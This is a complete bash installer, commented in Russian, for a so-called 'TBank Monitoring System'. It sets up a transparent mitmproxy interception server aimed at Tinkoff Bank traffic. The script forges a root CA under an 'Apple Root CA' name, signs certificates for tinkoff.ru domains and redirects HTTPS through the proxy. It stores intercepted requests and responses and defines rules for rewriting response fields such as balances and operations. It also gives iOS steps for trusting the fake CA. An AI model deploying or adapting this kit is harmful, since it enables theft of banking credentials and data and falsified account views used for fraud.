#!/bin/bash
# tbank_installer/install.sh

set -e

# Цвета для вывода
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Конфигурация
INSTALL_DIR="/opt/tbank-system"
LOG_DIR="/var/log/tbank"
CONFIG_DIR="/etc/tbank"
USER="tbank"
DB_NAME="tbank_monitor"
DB_USER="tbank_user"
DB_PASS=$(openssl rand -base64 32)

# Функции вывода
print_info() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

print_warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Проверка прав
check_root() {
    if [ "$EUID" -ne 0 ]; then 
        print_error "Запустите скрипт с правами root: sudo $0"
        exit 1
    fi
}

# Проверка системы
check_system() {
    print_info "Проверка системы..."
    
    # Проверка дистрибутива
    if [ ! -f /etc/os-release ]; then
        print_error "Не удалось определить дистрибутив"
        exit 1
    fi
    
    source /etc/os-release
    
    # Поддерживаемые дистрибутивы
    case $ID in
        ubuntu|debian)
            print_info "Дистрибутив: $NAME $VERSION"
            ;;
        *)
            print_warn "Дистрибутив $ID может не поддерживаться полностью"
            ;;
    esac
    
    # Проверка памяти
    MEM_TOTAL=$(grep MemTotal /proc/meminfo | awk '{print $2}')
    if [ $MEM_TOTAL -lt 2000000 ]; then
        print_warn "Мало памяти (рекомендуется минимум 2GB)"
    fi
    
    # Проверка диска
    DISK_FREE=$(df / | tail -1 | awk '{print $4}')
    if [ $DISK_FREE -lt 5000000 ]; then
        print_warn "Мало свободного места (рекомендуется минимум 5GB)"
    fi
}

# Установка зависимостей
install_dependencies() {
    print_info "Установка системных зависимостей..."
    
    apt-get update
    apt-get install -y \
        python3 \
        python3-pip \
        python3-venv \
        python3-dev \
        git \
        nginx \
        certbot \
        python3-certbot-nginx \
        postgresql \
        postgresql-contrib \
        sqlite3 \
        libpq-dev \
        build-essential \
        libssl-dev \
        libffi-dev \
        iptables-persistent \
        netfilter-persistent \
        net-tools \
        screen \
        tmux \
        curl \
        wget \
        openssl \
        qrencode \
        jq
    
    # Установка Node.js
    curl -fsSL https://deb.nodesource.com/setup_18.x | bash -
    apt-get install -y nodejs
    
    print_info "Зависимости установлены"
}

# Создание пользователя и директорий
setup_environment() {
    print_info "Настройка окружения..."
    
    # Создание пользователя
    if ! id -u $USER >/dev/null 2>&1; then
        useradd -m -s /bin/bash $USER
        print_info "Пользователь $USER создан"
    fi
    
    # Создание директорий
    mkdir -p $INSTALL_DIR
    mkdir -p $LOG_DIR
    mkdir -p $CONFIG_DIR
    mkdir -p $INSTALL_DIR/{static,static/css,static/js,static/data,templates,certs,logs,sessions}
    
    # Права доступа
    chown -R $USER:$USER $INSTALL_DIR
    chown -R $USER:$USER $LOG_DIR
    chmod 755 $INSTALL_DIR
    chmod 755 $LOG_DIR
    
    print_info "Окружение настроено"
}

# Настройка базы данных PostgreSQL
setup_database() {
    print_info "Настройка базы данных..."
    
    # Запуск PostgreSQL
    systemctl start postgresql
    systemctl enable postgresql
    
    # Создание базы данных и пользователя
    sudo -u postgres psql -c "CREATE DATABASE $DB_NAME;" 2>/dev/null || true
    sudo -u postgres psql -c "CREATE USER $DB_USER WITH PASSWORD '$DB_PASS';" 2>/dev/null || true
    sudo -u postgres psql -c "GRANT ALL PRIVILEGES ON DATABASE $DB_NAME TO $DB_USER;" 2>/dev/null || true
    
    # Создание таблиц
    cat > /tmp/init_db.sql << EOF
CREATE TABLE IF NOT EXISTS profiles (
    id SERIAL PRIMARY KEY,
    profile_id VARCHAR(50) UNIQUE,
    name VARCHAR(100),
    balance DECIMAL(10,2),
    data JSONB,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS operations (
    id SERIAL PRIMARY KEY,
    profile_id VARCHAR(50),
    direction VARCHAR(20),
    method VARCHAR(50),
    amount DECIMAL(10,2),
    description TEXT,
    bank VARCHAR(100),
    recipient VARCHAR(100),
    timestamp TIMESTAMP,
    metadata JSONB,
    FOREIGN KEY (profile_id) REFERENCES profiles(profile_id)
);

CREATE TABLE IF NOT EXISTS replacement_rules (
    id SERIAL PRIMARY KEY,
    active BOOLEAN DEFAULT TRUE,
    target_field VARCHAR(100),
    match_pattern TEXT,
    replace_value TEXT,
    apply_to VARCHAR(20) DEFAULT 'both',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS intercepted_data (
    id SERIAL PRIMARY KEY,
    session_id VARCHAR(100),
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    method VARCHAR(10),
    url TEXT,
    request_headers JSONB,
    request_body TEXT,
    response_headers JSONB,
    response_body TEXT,
    processed BOOLEAN DEFAULT FALSE
);

CREATE INDEX idx_operations_profile ON operations(profile_id);
CREATE INDEX idx_operations_time ON operations(timestamp);
CREATE INDEX idx_intercepted_time ON intercepted_data(timestamp);
EOF
    
    sudo -u postgres psql -d $DB_NAME -f /tmp/init_db.sql
    rm /tmp/init_db.sql
    
    # Сохранение конфигурации базы данных
    cat > $CONFIG_DIR/database.conf << EOF
[database]
host=localhost
port=5432
name=$DB_NAME
user=$DB_USER
password=$DB_PASS
EOF
    
    chmod 600 $CONFIG_DIR/database.conf
    
    print_info "База данных настроена"
}

# Установка Python приложения
install_application() {
    print_info "Установка Python приложения..."
    
    # Копирование файлов приложения
    cp -r src/* $INSTALL_DIR/
    
    # Создание виртуального окружения
    sudo -u $USER python3 -m venv $INSTALL_DIR/venv
    
    # Установка зависимостей Python
    sudo -u $USER bash -c "source $INSTALL_DIR/venv/bin/activate && \
                          pip install --upgrade pip && \
                          pip install -r $INSTALL_DIR/requirements.txt"
    
    # Установка MITMproxy
    sudo -u $USER bash -c "source $INSTALL_DIR/venv/bin/activate && \
                          pip install mitmproxy==9.0.1"
    
    # Настройка приложения
    cat > $INSTALL_DIR/config.py << EOF
import os

class Config:
    SECRET_KEY = '$(openssl rand -hex 32)'
    SQLALCHEMY_DATABASE_URI = 'postgresql://$DB_USER:$DB_PASS@localhost/$DB_NAME'
    SQLALCHEMY_TRACK_MODIFICATIONS = False
    SESSION_TYPE = 'filesystem'
    INSTALL_DIR = '$INSTALL_DIR'
    LOG_DIR = '$LOG_DIR'
    
    # MITMproxy настройки
    MITM_PORT = 8080
    MITM_HOST = '0.0.0.0'
    
    # SSL настройки
    SSL_CERT = '$INSTALL_DIR/certs/ca.crt'
    SSL_KEY = '$INSTALL_DIR/certs/ca.key'
    
    # Настройки безопасности
    MAX_CONTENT_LENGTH = 50 * 1024 * 1024  # 50MB
    UPLOAD_FOLDER = '$INSTALL_DIR/uploads'
    
    @staticmethod
    def init_app(app):
        os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
        os.makedirs(app.config['LOG_DIR'], exist_ok=True)
EOF
    
    print_info "Приложение установлено"
}

# Генерация SSL сертификатов
generate_certificates() {
    print_info "Генерация SSL сертификатов..."
    
    cd $INSTALL_DIR/certs
    
    # Генерация корневого CA
    openssl genrsa -out ca.key 4096
    openssl req -x509 -new -nodes -key ca.key -sha256 -days 3650 \
        -subj "/C=US/ST=California/L=Cupertino/O=Apple Inc./CN=Apple Root CA" \
        -addext "keyUsage=critical,keyCertSign,cRLSign,digitalSignature" \
        -addext "basicConstraints=critical,CA:TRUE" \
        -out ca.crt
    
    # Конвертация для iOS
    openssl x509 -in ca.crt -outform DER -out ca.der
    
    # Сертификат для доменов Т-Банк
    openssl genrsa -out tbank.key 2048
    openssl req -new -key tbank.key -out tbank.csr \
        -subj "/C=RU/ST=Moscow/L=Moscow/O=Tinkoff Bank/CN=*.tinkoff.ru" \
        -addext "subjectAltName=DNS:*.tinkoff.ru,DNS:*.tcsbank.ru,DNS:tinkoff.ru"
    
    openssl x509 -req -in tbank.csr -CA ca.crt -CAkey ca.key -CAcreateserial \
        -out tbank.crt -days 365 -sha256 \
        -extfile <(printf "subjectAltName=DNS:*.tinkoff.ru,DNS:*.tcsbank.ru,DNS:tinkoff.ru")
    
    # Сертификат для веб-панели
    openssl req -newkey rsa:2048 -nodes -keyout panel.key \
        -subj "/C=RU/ST=Moscow/L=Moscow/O=TBank System/CN=tbank.local" \
        -out panel.csr
    
    openssl x509 -req -in panel.csr -CA ca.crt -CAkey ca.key -CAcreateserial \
        -out panel.crt -days 365 -sha256
    
    # Права доступа
    chown -R $USER:$USER $INSTALL_DIR/certs
    chmod 600 $INSTALL_DIR/certs/*.key
    
    # Генерация QR кода для сертификата
    qrencode -t PNG -o $INSTALL_DIR/certs/ca_qr.png "http://$(hostname -I | awk '{print $1}'):8000/ca.der"
    
    print_info "Сертификаты сгенерированы"
}

# Настройка MITMproxy
setup_mitmproxy() {
    print_info "Настройка MITMproxy..."
    
    # Копирование конфигурации
    cp config/mitmproxy.service /etc/systemd/system/
    
    # Настройка системы
    echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
    echo "net.ipv6.conf.all.forwarding=1" >> /etc/sysctl.conf
    sysctl -p
    
    # Настройка iptables
    cat > /tmp/iptables_rules.sh << 'EOF'
#!/bin/bash
# Правила для перенаправления трафика
iptables -t nat -F
iptables -t mangle -F
iptables -F
iptables -X

# Перенаправление HTTP/HTTPS на MITMproxy
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080

# Разрешить форвардинг
iptables -A FORWARD -j ACCEPT
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Сохранение правил
netfilter-persistent save
EOF
    
    chmod +x /tmp/iptables_rules.sh
    /tmp/iptables_rules.sh
    
    # Создание конфигурации MITMproxy
    cat > $INSTALL_DIR/mitm_config.yaml << EOF
confdir: $INSTALL_DIR/.mitmproxy
listen_port: 8080
listen_host: 0.0.0.0
mode: transparent
ssl_insecure: true
showhost: true
stream_large_bodies: 1
anticache: true
anticomp: true
save_stream_file: $LOG_DIR/mitm_sessions
client_certs: $INSTALL_DIR/certs/tbank.crt
certs: *=$INSTALL_DIR/certs/tbank.crt
EOF
    
    chown -R $USER:$USER $INSTALL_DIR/.mitmproxy
    
    print_info "MITMproxy настроен"
}

# Настройка Nginx
setup_nginx() {
    print_info "Настройка Nginx..."
    
    # Копирование конфигурации
    cp config/nginx.conf /etc/nginx/sites-available/tbank
    
    # Создание симлинка
    ln -sf /etc/nginx/sites-available/tbank /etc/nginx/sites-enabled/
    rm -f /etc/nginx/sites-enabled/default
    
    # Создание директории для логов
    mkdir -p /var/log/nginx/tbank
    
    # Настройка SSL (если есть домен)
    read -p "Есть ли у вас доменное имя для системы? (y/n): " has_domain
    
    if [ "$has_domain" = "y" ]; then
        read -p "Введите доменное имя: " domain_name
        sed -i "s/server_name _;/server_name $domain_name;/g" /etc/nginx/sites-available/tbank
        
        # Получение SSL сертификата
        certbot --nginx -d $domain_name --non-interactive --agree-tos --email admin@$domain_name
    else
        # Используем самоподписанный сертификат
        openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
            -keyout /etc/ssl/private/nginx-selfsigned.key \
            -out /etc/ssl/certs/nginx-selfsigned.crt \
            -subj "/C=RU/ST=Moscow/L=Moscow/O=TBank System/CN=$(hostname)"
        
        # Настройка самоподписанного сертификата в Nginx
        sed -i 's|ssl_certificate .*|ssl_certificate /etc/ssl/certs/nginx-selfsigned.crt;|' /etc/nginx/sites-available/tbank
        sed -i 's|ssl_certificate_key .*|ssl_certificate_key /etc/ssl/private/nginx-selfsigned.key;|' /etc/nginx/sites-available/tbank
    fi
    
    # Проверка конфигурации
    nginx -t
    
    # Перезагрузка Nginx
    systemctl restart nginx
    systemctl enable nginx
    
    print_info "Nginx настроен"
}

# Настройка Systemd служб
setup_services() {
    print_info "Настройка Systemd служб..."
    
    # Служба панели управления
    cat > /etc/systemd/system/tbank.service << EOF
[Unit]
Description=TBank Monitoring System
After=network.target postgresql.service nginx.service
Requires=postgresql.service

[Service]
Type=simple
User=$USER
Group=$USER
WorkingDirectory=$INSTALL_DIR
Environment="PATH=$INSTALL_DIR/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
ExecStart=$INSTALL_DIR/venv/bin/python $INSTALL_DIR/app.py
ExecReload=/bin/kill -HUP \$MAINPID
Restart=always
RestartSec=10
StandardOutput=append:$LOG_DIR/tbank.log
StandardError=append:$LOG_DIR/tbank.error.log

[Install]
WantedBy=multi-user.target
EOF
    
    # Служба MITMproxy
    cat > /etc/systemd/system/mitmproxy.service << EOF
[Unit]
Description=MITMProxy for TBank
After=network.target
Before=tbank.service

[Service]
Type=simple
User=$USER
Group=$USER
WorkingDirectory=$INSTALL_DIR
Environment="PATH=$INSTALL_DIR/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
ExecStart=$INSTALL_DIR/venv/bin/mitmweb --mode transparent --showhost --ssl-insecure --set confdir=$INSTALL_DIR/.mitmproxy -s $INSTALL_DIR/mitm_script.py
ExecReload=/bin/kill -HUP \$MAINPID
Restart=always
RestartSec=10
StandardOutput=append:$LOG_DIR/mitmproxy.log
StandardError=append:$LOG_DIR/mitmproxy.error.log

[Install]
WantedBy=multi-user.target
EOF
    
    # Служба для раздачи сертификата
    cat > /etc/systemd/system/cert-server.service << EOF
[Unit]
Description=Certificate Distribution Server
After=network.target

[Service]
Type=simple
User=$USER
Group=$USER
WorkingDirectory=$INSTALL_DIR/certs
ExecStart=/usr/bin/python3 -m http.server 8000
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF
    
    # Перезагрузка systemd
    systemctl daemon-reload
    
    # Включение автозапуска
    systemctl enable tbank.service
    systemctl enable mitmproxy.service
    systemctl enable cert-server.service
    
    # Запуск служб
    systemctl start tbank.service
    systemctl start mitmproxy.service
    systemctl start cert-server.service
    
    print_info "Systemd службы настроены"
}

# Настройка бэкапа
setup_backup() {
    print_info "Настройка системы бэкапа..."
    
    # Создание скрипта бэкапа
    cat > /usr/local/bin/tbank-backup << 'EOF'
#!/bin/bash
BACKUP_DIR="/var/backups/tbank"
DATE=$(date +%Y%m%d_%H%M%S)
RETENTION_DAYS=7

mkdir -p $BACKUP_DIR

# Бэкап базы данных
sudo -u postgres pg_dump tbank_monitor > $BACKUP_DIR/tbank_db_$DATE.sql

# Бэкап файлов системы
tar -czf $BACKUP_DIR/tbank_files_$DATE.tar.gz \
    /opt/tbank-system \
    /etc/tbank \
    /etc/nginx/sites-available/tbank \
    /etc/systemd/system/tbank.service \
    /etc/systemd/system/mitmproxy.service

# Бэкап логов
tar -czf $BACKUP_DIR/tbank_logs_$DATE.tar.gz /var/log/tbank/

# Очистка старых бэкапов
find $BACKUP_DIR -name "*.sql" -mtime +$RETENTION_DAYS -delete
find $BACKUP_DIR -name "*.tar.gz" -mtime +$RETENTION_DAYS -delete

echo "Backup completed: $BACKUP_DIR/tbank_backup_$DATE.tar.gz"
EOF
    
    chmod +x /usr/local/bin/tbank-backup
    
    # Добавление в cron (ежедневно в 2:00)
    (crontab -l 2>/dev/null; echo "0 2 * * * /usr/local/bin/tbank-backup") | crontab -
    
    print_info "Система бэкапа настроена"
}

# Настройка мониторинга
setup_monitoring() {
    print_info "Настройка мониторинга..."
    
    # Установка мониторинга
    apt-get install -y htop iftop nethogs
    
    # Создание скрипта мониторинга
    cat > /usr/local/bin/tbank-monitor << 'EOF'
#!/bin/bash
echo "=== TBank System Monitor ==="
echo "Time: $(date)"
echo ""
echo "=== Services Status ==="
systemctl status tbank.service --no-pager -l | head -20
echo ""
systemctl status mitmproxy.service --no-pager -l | head -20
echo ""
echo "=== Network Connections ==="
netstat -tulpn | grep -E ':5000|:8080|:8000'
echo ""
echo "=== Resource Usage ==="
free -h
echo ""
echo "=== Disk Usage ==="
df -h /opt /var
echo ""
echo "=== Recent Logs ==="
tail -20 /var/log/tbank/tbank.log
EOF
    
    chmod +x /usr/local/bin/tbank-monitor
    
    # Настройка logrotate
    cat > /etc/logrotate.d/tbank << EOF
/var/log/tbank/*.log {
    daily
    missingok
    rotate 30
    compress
    delaycompress
    notifempty
    create 0640 $USER $USER
    sharedscripts
    postrotate
        systemctl reload tbank.service > /dev/null 2>&1 || true
    endscript
}
EOF
    
    print_info "Мониторинг настроен"
}

# Финальная настройка
final_setup() {
    print_info "Финальная настройка системы..."
    
    # Создание файла информации
    cat > $INSTALL_DIR/INSTALL_INFO.txt << EOF
=============================================
TBank Monitoring System - Установка завершена
=============================================

Установочная директория: $INSTALL_DIR
Логи системы: $LOG_DIR
Конфигурация: $CONFIG_DIR
Пользователь системы: $USER

Доступ к панели управления:
- Локально: http://localhost:5000
- По сети: http://$(hostname -I | awk '{print $1}'):5000
- HTTPS: https://$(hostname -I | awk '{print $1}') (самоподписанный сертификат)

Для установки сертификата на iOS:
1. Откройте в Safari: http://$(hostname -I | awk '{print $1}'):8000/ca.der
2. Скачайте и установите профиль
3. Настройки -> Основные -> О устройстве -> Сертификаты доверяния
4. Включите установленный сертификат

Настройка iOS устройства:
1. Подключитесь к Wi-Fi сети
2. В настройках Wi-Fi выберите "Настроить прокси"
3. Выберите "Вручную"
4. Сервер: $(hostname -I | awk '{print $1}')
5. Порт: 8080

Команды управления:
- Запуск/остановка: systemctl start/stop tbank.service
- Перезагрузка: systemctl restart tbank.service
- Статус: systemctl status tbank.service
- Просмотр логов: journalctl -u tbank.service -f
- Резервное копирование: tbank-backup
- Мониторинг: tbank-monitor

База данных:
- Имя: $DB_NAME
- Пользователь: $DB_USER
- Пароль: $DB_PASS

Безопасность:
- Не забудьте сменить пароли по умолчанию
- Настройте файрвол для ограничения доступа
- Регулярно обновляйте систему

Техническая поддержка:
- Логи ошибок: $LOG_DIR/tbank.error.log
- Логи MITMproxy: $LOG_DIR/mitmproxy.log
- Логи Nginx: /var/log/nginx/tbank/

Удаление системы: /opt/tbank-system/uninstall.sh
EOF
    
    # Права доступа
    chmod 600 $INSTALL_DIR/INSTALL_INFO.txt
    
    # Вывод информации
    cat $INSTALL_DIR/INSTALL_INFO.txt
    
    print_info "Установка завершена успешно!"
    print_info "Перезагрузите систему для применения всех изменений"
    print_info "sudo reboot"
}

# Главная функция
main() {
    clear
    echo "========================================"
    echo "  Установщик TBank Monitoring System   "
    echo "========================================"
    echo ""
    
    check_root
    check_system
    
    print_info "Начинается установка системы..."
    
    # Этапы установки
    install_dependencies
    setup_environment
    setup_database
    install_application
    generate_certificates
    setup_mitmproxy
    setup_nginx
    setup_services
    setup_backup
    setup_monitoring
    final_setup
    
    exit 0
}

# Запуск
main "$@"